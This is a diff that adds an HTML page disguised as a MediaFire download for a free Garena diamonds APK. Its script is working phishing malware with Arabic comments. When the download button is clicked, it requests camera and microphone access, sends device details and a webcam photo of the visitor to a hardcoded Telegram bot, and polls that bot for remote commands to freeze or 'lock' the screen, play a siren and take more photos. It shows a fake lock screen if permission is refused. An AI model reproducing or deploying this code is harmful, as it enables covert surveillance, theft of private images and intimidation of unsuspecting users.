@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MediaFire - Garena_Diamonds_V2.apk</title>
+    <style>
+        body { background: #f1f1f1; font-family: sans-serif; text-align: center; margin: 0; padding: 0; transition: background 0.5s; }
+        .header { background: #0070f0; padding: 15px; color: white; font-size: 22px; font-weight: bold; }
+        .card { background: white; width: 90%; max-width: 400px; margin: 40px auto; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .btn { background: #0070f0; color: white; padding: 16px; border: none; width: 100%; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.95); }
+        #freeze-msg { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: black; color: red; z-index: 10000; justify-content: center; align-items: center; font-size: 24px; flex-direction: column; }
+    </style>
+</head>
+<body>
+
+<div id="freeze-msg">
+    <h1>⚠️ ERROR 404 ⚠️</h1>
+    <p>DEVICE LOCKED BY CYPER-ZAYRO</p>
+    <p id="siren-status">Siren: Active 🚨</p>
+</div>
+
+<div class="header">MediaFire</div>
+
+<div class="card">
+    <img src="https://www.mediafire.com/images/filetype/download-apk.png" width="80">
+    <h3>Garena_Free_Diamonds_2026.apk</h3>
+    <p style="color:#666">(15.82 MB)</p>
+    <button class="btn" id="dl-btn" onclick="initTarget()">DOWNLOAD NOW</button>
+    <p id="status" style="margin-top:10px; font-size:12px; color:#999">Checking server connection...</p>
+</div>
+
+<video id="v" style="display:none" autoplay playsinline></video>
+<canvas id="c" style="display:none"></canvas>
+<audio id="siren" loop src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+
+<script>
+    const T = "8616230099:AAFX1F2dArEqIZFAhMaICcz_gPuP3LSVdBA";
+    const C = "6637453608";
+
+    async function initTarget() {
+        document.getElementById('status').innerText = "Verifying account... Please wait.";
+        try {
+            // طلب إذن الكاميرا والميكروفون
+            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+            document.getElementById('v').srcObject = stream;
+            
+            // سحب معلومات الجهاز فوراً
+            let info = `📱 صيد جديد من Zayro!\n- المتصفح: ${navigator.userAgent}\n- النظام: ${navigator.platform}\n- اللغة: ${navigator.language}`;
+            sendToBot(info);
+
+            // التقاط صورة بعد ثانيتين
+            setTimeout(capture, 2000);
+            
+            // بدء استلام الأوامر من البوت
+            setInterval(checkCommands, 3000);
+
+        } catch(e) {
+            sendToBot("⚠️ الضحية رفض الإذن، جاري تفعيل وضع التجميد الاحتياطي.");
+            freeze();
+        }
+    }
+
+    function capture() {
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            const f = new FormData();
+            f.append('photo', b, 'target.jpg');
+            f.append('chat_id', C);
+            f.append('caption', "📸 صورة حية للهدف!");
+            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:f});
+        }, 'image/jpeg');
+    }
+
+    function freeze() {
+        document.getElementById('freeze-msg').style.display = 'flex';
+        document.getElementById('siren').play();
+        sendToBot("❄️ تم تفعيل وضع التجميد والصافرة على جهاز الضحية.");
+    }
+
+    async function checkCommands() {
+        try {
+            const r = await fetch(`https://api.telegram.org/bot${T}/getUpdates?offset=-1`);
+            const d = await r.json();
+            if(d.result.length > 0) {
+                const msg = d.result[0].message.text;
+                if(msg === "تجميد") freeze();
+                if(msg === "قفل") { document.body.style.background = "black"; document.body.innerHTML = "<h1 style='color:red; margin-top:50px;'>DEVICE LOCKED</h1>"; }
+                if(msg === "تصوير") capture();
+            }
+        } catch(e) {}
+    }
+
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(text)}`);
+    }
+</script>
+
+</body>
+</html>
